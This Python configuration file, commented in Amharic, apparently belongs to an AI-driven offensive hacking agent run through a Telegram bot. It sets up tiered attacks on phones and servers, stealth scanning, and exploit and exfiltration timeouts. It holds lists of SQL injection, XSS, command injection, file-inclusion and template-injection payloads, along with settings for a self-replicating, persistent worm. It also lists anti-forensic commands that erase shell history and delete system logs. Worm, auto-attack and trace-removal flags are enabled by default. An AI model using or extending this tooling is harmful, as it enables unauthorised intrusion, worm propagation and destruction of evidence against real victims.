# ============================================================
# 👑 ULTIMATE GOLD AGENTIC AI - COMPLETE CONFIGURATION SYSTEM
# ============================================================
# ይህ ሞጁል ሁሉንም የስርዓት ቅንብሮች ያስተዳድራል
# - ከአካባቢ ተለዋዋጮች መጫን (.env)
# - ነባር እሴቶች (Defaults)
# - ማረጋገጫ (Validation)
# - ተለዋዋጭ መጫን (Dynamic reload)
# - ሁሉንም የስርዓት ክፍሎች ቅንብሮች
# ============================================================

import os
import re
import json
import hashlib
import logging
from typing import Dict, List, Optional, Any, Union, Tuple
from dataclasses import dataclass, field
from enum import Enum
import threading
from datetime import timedelta
import pathlib
import sys

# ============================================================
# የሎግ ቅንብሮች (Logging Configuration)
# ============================================================

class LogLevel(Enum):
    DEBUG = 10
    INFO = 20
    WARNING = 30
    ERROR = 40
    CRITICAL = 50

class LogFormat(Enum):
    SIMPLE = "simple"
    DETAILED = "detailed"
    JSON = "json"

# ============================================================
# የትዕዛዝ ቅድሚያ ደረጃዎች (Command Priorities)
# ============================================================

class Priority(Enum):
    CRITICAL = 0
    HIGH = 1
    NORMAL = 2
    LOW = 3
    BACKGROUND = 4

# ============================================================
# የጥቃት ደረጃዎች (Attack Levels)
# ============================================================

class AttackLevel(Enum):
    MOBILE = "mobile"
    STANDARD = "standard"
    GOLD = "gold"

class AttackTask(Enum):
    FULL = "full"
    MODIFY = "modify"
    RECON_ONLY = "recon_only"

# ============================================================
# የAI ሞዴል ዓይነቶች (AI Model Types)
# ============================================================

class AIModel(Enum):
    OPENAI_GPT4O = "gpt-4o"
    OPENAI_GPT4O_MINI = "gpt-4o-mini"
    DEEPSEEK_CHAT = "deepseek-chat"
    OPENROUTER_LLAMA = "meta-llama/llama-3.2-3b-instruct:free"
    OPENROUTER_MISTRAL = "mistralai/mistral-7b-instruct:free"
    OPENROUTER_CLAUDE = "anthropic/claude-3-haiku"

# ============================================================
# የአውታረ መረብ ቅንብሮች (Network Settings)
# ============================================================

@dataclass
class NetworkConfig:
    """የአውታረ መረብ ቅንብሮች"""
    # ፖርት ቅኝት
    default_ports: List[int] = field(default_factory=lambda: [
        21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995,
        3306, 3389, 5432, 5900, 6379, 8080, 8443, 9000
    ])
    scan_timeout: float = 1.0  # ሰከንዶች
    stealth_scan_timeout: float = 5.0
    max_scan_workers: int = 100
    ping_timeout: float = 2.0
    dns_timeout: float = 3.0
    http_timeout: float = 5.0

    # የHTTP ራስጌዎች
    default_user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    stealth_user_agents: List[str] = field(default_factory=lambda: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
    ])

    # የተለመዱ አውታረ መረቦች (Common Networks)
    common_networks: List[str] = field(default_factory=lambda: [
        "192.168.0.0/16", "10.0.0.0/8", "172.16.0.0/12"
    ])

    # DNS ሰርቨሮች
    dns_servers: List[str] = field(default_factory=lambda: [
        "8.8.8.8", "1.1.1.1", "208.67.222.222", "9.9.9.9"
    ])

# ============================================================
# የAttack ቅንብሮች (Attack Settings)
# ============================================================

@dataclass
class AttackConfig:
    """የጥቃት ቅንብሮች"""
    # አጠቃላይ
    max_retries: int = 3
    retry_delay: float = 1.0
    global_timeout: float = 3600.0  # 1 hour

    # ሞባይል ጥቃት (Level 1)
    mobile_phone_timeout: float = 86400.0  # 24 hours
    mobile_wifi_timeout: float = 1800.0   # 30 minutes
    mobile_otp_delay: float = 60.0        # 1 minute
    mobile_max_attempts: int = 100

    # መደበኛ ሰርቨር (Level 2)
    standard_scan_timeout: float = 300.0   # 5 minutes
    standard_exploit_timeout: float = 60.0
    standard_exfil_timeout: float = 30.0

    # Gold Level (Level 3)
    gold_recon_timeout: float = 3600.0     # 1 hour
    gold_exploit_timeout: float = 7200.0   # 2 hours
    gold_exfil_timeout: float = 1800.0     # 30 minutes
    gold_sleep_between: float = 10.0       # ሰከንዶች
    gold_jitter: float = 5.0               # የዘፈቀደ መጠን

    # የጥቃት ፔይሎዶች
    sql_payloads: List[str] = field(default_factory=lambda: [
        "' OR '1'='1' -- ",
        "' UNION SELECT NULL--",
        "' AND SLEEP(5)--",
        "'; DROP TABLE users--",
        "' OR 1=1 AND 2=2--"
    ])
    xss_payloads: List[str] = field(default_factory=lambda: [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "'><script>alert(1)</script>",
        "javascript:alert(1)",
        "<svg onload=alert(1)>"
    ])
    rce_payloads: List[str] = field(default_factory=lambda: [
        "; whoami",
        "|| whoami",
        "| whoami",
        "& whoami",
        "`whoami`"
    ])
    lfi_payloads: List[str] = field(default_factory=lambda: [
        "../../../../etc/passwd",
        "../../../../etc/shadow",
        "../../../../var/log/apache2/access.log",
        "../../../../proc/self/environ"
    ])
    ssti_payloads: List[str] = field(default_factory=lambda: [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "{{config}}",
        "{{self.__class__.__mro__}}"
    ])

    # የዎርም ቅንብሮች
    worm_replication_interval: int = 300  # ሰከንዶች
    worm_max_workers: int = 200
    worm_scan_ports: List[int] = field(default_factory=lambda: [
        22, 80, 443, 445, 3389, 5000, 8080, 8443, 9000
    ])
    worm_persistence: bool = True
    worm_auto_remove: bool = True

    # ፍንጭ ማጥፋት (Trace Removal)
    trace_cleanup_commands: List[str] = field(default_factory=lambda: [
        'history -c',
        'rm -f ~/.bash_history',
        'rm -rf /var/log/*.log',
        'rm -rf /var/log/apache2/*',
        'rm -rf /var/log/nginx/*',
        'find / -name "*.log" -exec rm -rf {} \\;',
        'rm -rf /tmp/w.py /var/tmp/w.py /dev/shm/w.py'
    ])

# ============================================================
# የAI ቅንብሮች (AI Settings)
# ============================================================

@dataclass
class AIConfig:
    """የAI እና የትምህርት ቅንብሮች"""
    # ሞዴሎች
    primary_model: AIModel = AIModel.OPENAI_GPT4O_MINI
    secondary_model: AIModel = AIModel.DEEPSEEK_CHAT
    fallback_model: AIModel = AIModel.OPENROUTER_LLAMA

    # የጥያቄ ቅንብሮች
    temperature: float = 0.3
    max_tokens: int = 300
    top_p: float = 0.9
    frequency_penalty: float = 0.0
    presence_penalty: float = 0.0

    # የAI ውሳኔ ሰጪ (Agentic Core)
    learning_rate: float = 0.1
    exploration_factor: float = 0.3
    success_reinforcement: float = 0.05
    failure_penalty: float = 0.02

    # የAI ማህደረ ትውስታ
    max_memory_size: int = 10000
    memory_ttl: int = 86400  # 24 hours

    # የኢንተርኔት ትምህርት
    internet_learning_enabled: bool = True
    internet_learning_timeout: float = 5.0
    max_internet_sources: int = 5

    # የAI እድገት (Evolution)
    auto_evolution_enabled: bool = True
    evolution_check_interval: int = 3600  # ሰከንዶች
    max_evolution_generations: int = 100

# ============================================================
# የAPI ቅንብሮች (API Settings)
# ============================================================

@dataclass
class APIConfig:
    """የሶስት APIs ቅንብሮች"""
    # OpenAI
    openai_enabled: bool = True
    openai_api_key: Optional[str] = None
    openai_organization: Optional[str] = None
    openai_timeout: float = 30.0
    openai_max_retries: int = 3

    # DeepSeek
    deepseek_enabled: bool = True
    deepseek_api_key: Optional[str] = None
    deepseek_timeout: float = 30.0
    deepseek_max_retries: int = 3

    # OpenRouter
    openrouter_enabled: bool = True
    openrouter_api_key: Optional[str] = None
    openrouter_timeout: float = 30.0
    openrouter_max_retries: int = 3
    openrouter_models: List[str] = field(default_factory=lambda: [
        "meta-llama/llama-3.2-3b-instruct:free",
        "mistralai/mistral-7b-instruct:free",
        "anthropic/claude-3-haiku"
    ])

    # የጋራ ቅንብሮች
    use_consensus: bool = True
    consensus_threshold: int = 2  # ከ3 ውስጥ ስንቱ መስማማት አለባቸው
    fallback_to_single: bool = True

# ============================================================
# የውሂብ ጎታ ቅንብሮች (Database Settings)
# ============================================================

@dataclass
class DatabaseConfig:
    """የውሂብ ጎታ ቅንብሮች"""
    db_type: str = "sqlite"  # sqlite, postgresql, mysql
    sqlite_path: str = "gold_ai.db"
    postgresql_dsn: Optional[str] = None
    mysql_dsn: Optional[str] = None

    # የግንኙነት ገንዳ
    pool_size: int = 10
    max_overflow: int = 20
    pool_recycle: int = 3600

    # የማስቀመጫ ጊዜ
    history_retention_days: int = 30
    log_retention_days: int = 7

    # ማመሳሰል
    backup_enabled: bool = True
    backup_interval: int = 86400  # 24 hours

# ============================================================
# የደህንነት ቅንብሮች (Security Settings)
# ============================================================

@dataclass
class SecurityConfig:
    """የደህንነት ቅንብሮች"""
    # ምስጠራ
    encryption_enabled: bool = True
    encryption_key: Optional[str] = None
    hash_algorithm: str = "sha256"

    # የተጠቃሚ ማረጋገጫ
    authentication_enabled: bool = False
    admin_users: List[str] = field(default_factory=list)
    api_token_required: bool = False

    # የጥቃት ገደቦች
    rate_limit_enabled: bool = True
    rate_limit_requests: int = 100
    rate_limit_period: int = 60  # ሰከንዶች

    # የሚፈቀዱ IPዎች
    allowed_ips: List[str] = field(default_factory=lambda: ["*"])
    blocked_ips: List[str] = field(default_factory=list)

    # ደህንነት ማስጠንቀቂያ
    disable_dangerous_commands: bool = False
    require_confirmation: bool = True

# ============================================================
# የTelegram Bot ቅንብሮች (Telegram Bot Settings)
# ============================================================

@dataclass
class TelegramConfig:
    """የTelegram Bot ቅንብሮች"""
    token: Optional[str] = None
    webhook_url: Optional[str] = None
    webapp_url: Optional[str] = None

    # የትዕዛዝ ቅንብሮች
    command_prefix: str = "/"
    allow_plain_text_commands: bool = True

    # የተጠቃሚ ገደቦች
    allowed_users: List[str] = field(default_factory=list)
    admin_users: List[str] = field(default_factory=list)

    # የማሳወቂያ
    enable_notifications: bool = True
    notify_on_completion: bool = True

# ============================================================
# የፓነል እና UI ቅንብሮች (Panel & UI Settings)
# ============================================================

@dataclass
class UIConfig:
    """የዳሽቦርድ እና UI ቅንብሮች"""
    theme: str = "dark"  # dark, light, matrix
    accent_color: str = "#00ff41"
    gold_accent: str = "#ffd700"

    # የፓነል ክፍሎች
    show_realtime_logs: bool = True
    show_attack_history: bool = True
    show_capabilities: bool = True
    show_system_status: bool = True

    # የፓነል መቆጣጠሪያ
    allow_dynamic_panel: bool = True
    max_panel_sections: int = 20

    # የቋንቋ ቅንብሮች
    default_language: str = "am"  # am, en
    supported_languages: List[str] = field(default_factory=lambda: ["am", "en"])

# ============================================================
# ዋናው የConfig ክፍል (Main Config Class)
# ============================================================

class Config:
    """ሙሉ የስርዓት ቅንብሮች አስተዳዳሪ"""
    _instance = None
    _lock = threading.Lock()

    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super(Config, cls).__new__(cls)
                    cls._instance._initialized = False
        return cls._instance

    def __init__(self):
        if self._initialized:
            return
        self._initialized = True

        # ሁሉንም ቅንብሮች መጫን
        self._load_from_env()
        self._validate()
        self._setup_logging()

    def _load_from_env(self):
        """ከአካባቢ ተለዋዋጮች (.env) ቅንብሮችን መጫን"""
        # የስርዓት መሰረታዊ መረጃ
        self.app_name = os.getenv('APP_NAME', 'Ultimate Gold Agentic AI')
        self.app_version = os.getenv('APP_VERSION', '3.0.0')
        self.debug = os.getenv('DEBUG', 'False').lower() in ('true', '1', 'yes')
        self.environment = os.getenv('ENVIRONMENT', 'production')
        self.secret_key = os.getenv('SECRET_KEY', self._generate_secret())

        # ሞጁሎችን መጫን
        self.network = NetworkConfig()
        self.attack = AttackConfig()
        self.ai = AIConfig()
        self.api = APIConfig()
        self.database = DatabaseConfig()
        self.security = SecurityConfig()
        self.telegram = TelegramConfig()
        self.ui = UIConfig()

        # የAPI ቁልፎችን መሙላት
        self.api.openai_api_key = os.getenv('OPENAI_API_KEY')
        self.api.deepseek_api_key = os.getenv('DEEPSEEK_API_KEY')
        self.api.openrouter_api_key = os.getenv('OPENROUTER_API_KEY')
        self.telegram.token = os.getenv('TELEGRAM_BOT_TOKEN')
        self.telegram.webhook_url = os.getenv('WEBHOOK_URL')
        self.telegram.webapp_url = os.getenv('WEBAPP_URL')

        # የደህንነት ቁልፍ
        self.security.encryption_key = os.getenv('ENCRYPTION_KEY', self._generate_secret())

        # የተጠቃሚ ዝርዝሮች
        admin_users_raw = os.getenv('ADMIN_USERS', '')
        if admin_users_raw:
            self.security.admin_users = [u.strip() for u in admin_users_raw.split(',')]
        self.telegram.admin_users = self.security.admin_users.copy()

        allowed_ips_raw = os.getenv('ALLOWED_IPS', '*')
        if allowed_ips_raw != '*':
            self.security.allowed_ips = [ip.strip() for ip in allowed_ips_raw.split(',')]

        # የውሂብ ጎታ
        self.database.postgresql_dsn = os.getenv('DATABASE_URL')

        # የተለያዩ ባህሪያት
        self.feature_flags = {
            'enable_evolution': os.getenv('ENABLE_EVOLUTION', 'True').lower() in ('true', '1', 'yes'),
            'enable_internet_learning': os.getenv('ENABLE_INTERNET_LEARNING', 'True').lower() in ('true', '1', 'yes'),
            'enable_worm': os.getenv('ENABLE_WORM', 'True').lower() in ('true', '1', 'yes'),
            'enable_trace_removal': os.getenv('ENABLE_TRACE_REMOVAL', 'True').lower() in ('true', '1', 'yes'),
            'enable_auto_attack': os.getenv('ENABLE_AUTO_ATTACK', 'True').lower() in ('true', '1', 'yes'),
        }

        # የሂደት ስም
        self.process_name = os.getenv('PROCESS_NAME', 'gold_ai_main')

        # የፋይል መንገዶች
        self.base_dir = pathlib.Path(__file__).parent.absolute()
        self.data_dir = pathlib.Path(os.getenv('DATA_DIR', self.base_dir / 'data'))
        self.log_dir = pathlib.Path(os.getenv('LOG_DIR', self.base_dir / 'logs'))
        self.temp_dir = pathlib.Path(os.getenv('TEMP_DIR', self.base_dir / 'temp'))

        # ማውጫዎችን መፍጠር
        for d in [self.data_dir, self.log_dir, self.temp_dir]:
            d.mkdir(parents=True, exist_ok=True)

    def _generate_secret(self) -> str:
        """የዘፈቀደ ሚስጥር ቁልፍ መፍጠር"""
        return hashlib.sha256(os.urandom(64)).hexdigest()

    def _validate(self):
        """ሁሉንም ቅንብሮች ማረጋገጥ"""
        errors = []

        # የTelegram Bot ቶከን ማረጋገጥ
        if not self.telegram.token:
            errors.append("TELEGRAM_BOT_TOKEN is not set but required.")
        elif not re.match(r'^\d+:[A-Za-z0-9_-]+$', self.telegram.token):
            errors.append("TELEGRAM_BOT_TOKEN format is invalid.")

        # የAPI ቁልፎች (አማራጭ)
        if self.api.openai_enabled and not self.api.openai_api_key:
            errors.append("OPENAI_API_KEY is not set but OpenAI is enabled.")
        if self.api.deepseek_enabled and not self.api.deepseek_api_key:
            errors.append("DEEPSEEK_API_KEY is not set but DeepSeek is enabled.")
        if self.api.openrouter_enabled and not self.api.openrouter_api_key:
            errors.append("OPENROUTER_API_KEY is not set but OpenRouter is enabled.")

        # የኢንክሪፕሽን ቁልፍ
        if self.security.encryption_enabled and not self.security.encryption_key:
            errors.append("Encryption enabled but ENCRYPTION_KEY is not set.")

        # የትዕዛዝ ቅድሚያ ማረጋገጥ
        if self.attack.max_retries < 0:
            errors.append("max_retries must be >= 0")
        if self.attack.gold_sleep_between < 0:
            errors.append("gold_sleep_between must be >= 0")

        # የውሂብ ጎታ
        if self.database.db_type not in ['sqlite', 'postgresql', 'mysql']:
            errors.append(f"Unsupported db_type: {self.database.db_type}")

        # የተጠቃሚ IP ፈቃድ
        if self.security.allowed_ips != ['*']:
            for ip in self.security.allowed_ips:
                if not re.match(r'^(\d{1,3}\.){3}\d{1,3}(/\d{1,2})?$', ip):
                    errors.append(f"Invalid IP/CIDR: {ip}")

        # የተፈቀዱ ቋንቋዎች
        for lang in self.ui.supported_languages:
            if lang not in ['am', 'en']:
                errors.append(f"Unsupported language: {lang}")

        if errors:
            raise ValueError(f"Configuration validation failed:\n" + "\n".join(f"  - {e}" for e in errors))

    def _setup_logging(self):
        """የሎግ ሲስተም ማዋቀር"""
        log_level = os.getenv('LOG_LEVEL', 'INFO').upper()
        level = getattr(logging, log_level, logging.INFO)

        log_format = os.getenv('LOG_FORMAT', 'detailed')
        if log_format == 'json':
            formatter = logging.Formatter(
                '{"time": "%(asctime)s", "level": "%(levelname)s", "name": "%(name)s", "message": "%(message)s"}'
            )
        elif log_format == 'detailed':
            formatter = logging.Formatter(
                '%(asctime)s - %(name)s - %(levelname)s - %(filename)s:%(lineno)d - %(message)s'
            )
        else:
            formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')

        # ስርዓት ሎገር
        root_logger = logging.getLogger()
        root_logger.setLevel(level)

        # ወደ ፋይል ማስቀመጫ
        log_file = self.log_dir / f"{self.process_name}.log"
        file_handler = logging.FileHandler(log_file)
        file_handler.setFormatter(formatter)
        root_logger.addHandler(file_handler)

        # ወደ ኮንሶል
        console_handler = logging.StreamHandler(sys.stdout)
        console_handler.setFormatter(formatter)
        root_logger.addHandler(console_handler)

        self.logger = root_logger

    def get_logger(self, name: str = None):
        """የሎገር ኢንስታንስ መመለስ"""
        if name:
            return logging.getLogger(name)
        return self.logger

    def reload(self):
        """ቅንብሮችን እንደገና መጫን (ከ.env እና ከሞጁሎች)"""
        self._load_from_env()
        self._validate()
        self._setup_logging()

    def to_dict(self) -> Dict[str, Any]:
        """ሁሉንም ቅንብሮች ወደ መዝገብ መለወጥ"""
        return {
            'app': {
                'name': self.app_name,
                'version': self.app_version,
                'debug': self.debug,
                'environment': self.environment,
            },
            'network': self._dataclass_to_dict(self.network),
            'attack': self._dataclass_to_dict(self.attack),
            'ai': self._dataclass_to_dict(self.ai),
            'api': self._dataclass_to_dict(self.api),
            'database': self._dataclass_to_dict(self.database),
            'security': self._dataclass_to_dict(self.security),
            'telegram': self._dataclass_to_dict(self.telegram),
            'ui': self._dataclass_to_dict(self.ui),
            'feature_flags': self.feature_flags,
        }

    @staticmethod
    def _dataclass_to_dict(obj):
        """Dataclass ነገርን ወደ መዝገብ መለወጥ"""
        if hasattr(obj, '__dataclass_fields__'):
            result = {}
            for field_name in obj.__dataclass_fields__:
                value = getattr(obj, field_name)
                if isinstance(value, Enum):
                    result[field_name] = value.value
                elif isinstance(value, (list, tuple)):
                    result[field_name] = [v.value if isinstance(v, Enum) else v for v in value]
                elif hasattr(value, '__dataclass_fields__'):
                    result[field_name] = Config._dataclass_to_dict(value)
                else:
                    result[field_name] = value
            return result
        return obj

    def to_json(self) -> str:
        """ቅንብሮችን ወደ JSON መለወጥ"""
        return json.dumps(self.to_dict(), indent=2, default=str)

    def save_to_file(self, path: str = "config_backup.json"):
        """ቅንብሮችን ወደ ፋይል ማስቀመጥ"""
        with open(path, 'w') as f:
            json.dump(self.to_dict(), f, indent=2, default=str)

    @classmethod
    def load_from_file(cls, path: str) -> 'Config':
        """ከፋይል ቅንብሮችን መጫን"""
        config = cls()
        with open(path, 'r') as f:
            data = json.load(f)
        # እንደገና መጫን ላይ ይህን መረጃ ማዋሃድ ይቻላል (ተጨማሪ አመቻች)
        return config

# ============================================================
# የአለም አቀፍ Config ኢንስታንስ
# ============================================================

config = Config()

# ============================================================
# ሙከራ እና ማሳያ (Testing & Demo)
# ============================================================

if __name__ == "__main__":
    print("=" * 60)
    print("👑 ULTIMATE GOLD AGENTIC AI - CONFIGURATION")
    print("=" * 60)
    print(f"App: {config.app_name} v{config.app_version}")
    print(f"Environment: {config.environment}")
    print(f"Debug: {config.debug}")
    print(f"Data Dir: {config.data_dir}")
    print(f"Log Dir: {config.log_dir}")
    print("-" * 60)
    print(f"OpenAI Enabled: {config.api.openai_enabled}")
    print(f"DeepSeek Enabled: {config.api.deepseek_enabled}")
    print(f"OpenRouter Enabled: {config.api.openrouter_enabled}")
    print(f"Telegram Token: {'Set' if config.telegram.token else 'NOT SET'}")
    print("-" * 60)
    print(f"Attack Level 1 (Mobile) Timeout: {config.attack.mobile_phone_timeout}s")
    print(f"Attack Level 2 (Standard) Timeout: {config.attack.standard_scan_timeout}s")
    print(f"Attack Level 3 (Gold) Timeout: {config.attack.gold_recon_timeout}s")
    print("-" * 60)
    print(f"AI Model: {config.ai.primary_model.value}")
    print(f"Learning Rate: {config.ai.learning_rate}")
    print(f"Exploration Factor: {config.ai.exploration_factor}")
    print("-" * 60)
    print(f"Feature Flags:")
    for key, val in config.feature_flags.items():
        print(f"  {key}: {val}")
    print("-" * 60)
    print("✅ Configuration loaded successfully!")
    print("=" * 60)

# ============================================================
# 🏆 ይህ ሙሉ የተሟላ የቅንብር ሲስተም ነው
# ============================================================
